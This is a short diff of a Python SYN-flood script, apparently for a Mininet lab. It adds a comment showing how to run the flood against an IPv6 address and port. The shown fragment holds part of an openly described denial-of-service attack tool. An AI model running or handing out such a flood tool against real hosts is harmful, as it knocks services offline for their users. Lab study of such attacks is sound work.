@@ -20,7 +20,7 @@ def syn_flood(target_ip, target_port, num_sources, packets_per_source):
             send(packet, verbose=False)
     
     print("Attack completed.")
-
+# h1 python /mininet/host-service/syn.py 2001:1:2::1 5001 100 10
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(description='Perform a SYN Flood attack on an IPv6 address.')
     parser.add_argument('target_ip', type=str, help='The target IPv6 address')
